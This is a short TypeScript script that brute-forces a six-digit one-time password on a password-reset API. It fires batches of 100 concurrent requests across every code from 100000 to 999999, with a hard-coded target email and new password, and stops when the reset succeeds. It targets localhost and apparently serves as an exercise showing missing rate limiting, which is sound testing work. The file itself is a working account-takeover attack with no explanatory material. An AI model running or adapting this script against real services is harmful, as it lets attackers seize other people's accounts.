import axios from 'axios';

let isFound = false;
async function sendOTP(email: string, newPassword: string, OTP: string) {
    let data = JSON.stringify({
        "email": email,
        "confirmPassword": newPassword,
        "otp": OTP
    });

    let config = {
        method: 'put',
        maxBodyLength: Infinity,
        url: 'http://localhost:3000/api/auth/resetPassword',
        headers: {
            'Content-Type': 'application/json',
        },
        data: data
    };
    try {
        const response = await axios.request(config);
        if (response.status == 200) {
            console.log("password reset");
            console.log(OTP);
            isFound = true;
        }
    } catch (err) {
        console.log(err)   
    }
}

async function main(email: string, newPassword: string) {
    for (let i = 100000; i < 1000000; i += 100) {
        let p = [];
        for (let j = 0; j < 100; j++) {
            p.push(sendOTP(email, newPassword, (i + j).toString()));
        }
        console.log('In range ', i);
        await Promise.all(p);
        if (isFound) {
            break;
        }
    }
    console.log("Ended")
}

main('nitaxe7090@lewenbo.com', 'nitaxe708');